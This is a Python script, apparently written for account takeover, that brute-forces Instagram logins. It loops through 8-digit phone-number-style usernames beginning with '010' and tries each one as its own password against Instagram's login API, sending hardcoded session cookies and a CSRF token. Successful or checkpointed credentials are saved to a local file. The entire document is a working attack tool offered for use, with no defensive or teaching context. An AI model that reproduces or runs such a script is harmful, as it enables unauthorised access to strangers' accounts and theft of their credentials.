import requests
import itertools as t
import time
nums = "01234567890"
the_smallest = 8
the_biggest = 8
if the_smallest == the_biggest:
	for a in t.product(nums, repeat=the_smallest):
		user = "010"+"".join(a)
		pasw = "010"+"".join(a)
		url = "https://www.instagram.com/accounts/login/ajax/"
		head = {
		'accept':'*/*',
		'accept-encoding':'gzip,deflate,br',
		'accept-language':'en-US,en;q=0.9,ar;q=0.8',
		'content-length':'269',
		'content-type':'application/x-www-form-urlencoded',
		'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
		'origin':'https://www.instagram.com',
		'referer':'https://www.instagram.com/',
		'sec-fetch-dest':'empty',
		'sec-fetch-mode':'cors',
		'sec-fetch-site':'same-origin',
		'user-agent': "generate_user_agent()",
		'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
		'x-ig-app-id':'936619743392459',
		'x-ig-www-claim':'0',
		'x-instagram-ajax':'8a8118fa7d40',
		'x-requested-with':'XMLHttpRequest',
		}
		data = {
		'username': user,
		'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:11223344:{pasw}',
		'queryParams': {},
		'optIntoOneTap': 'false'
		}
		login = requests.post(url,headers=head,data=data).text
		if '"authenticated":true'  in login:
			joker = 1
			print("We Have "+joker+" account")
			saved_file= open("instaacc.txt","a")
			saved_file.write("\n"+"username:   "+user+"\n"+"password:   "+pasw+"\n"+"_____________________________")
			joker += 1
		elif '"message":"checkpoint_required"' in login:
			rap = 1
			print ("ehtzaryyyyyyyyyyyyyy")
			saved_file= open("instaacc.txt","a")
			saved_file.write("\n"+"username:   "+user+"\n"+"password:   "+pasw+"\n"+"_____________________________")
			rap += 0
			print("We Have "+str(rap)+" account he")
		else :
				print(pasw)
				print (login)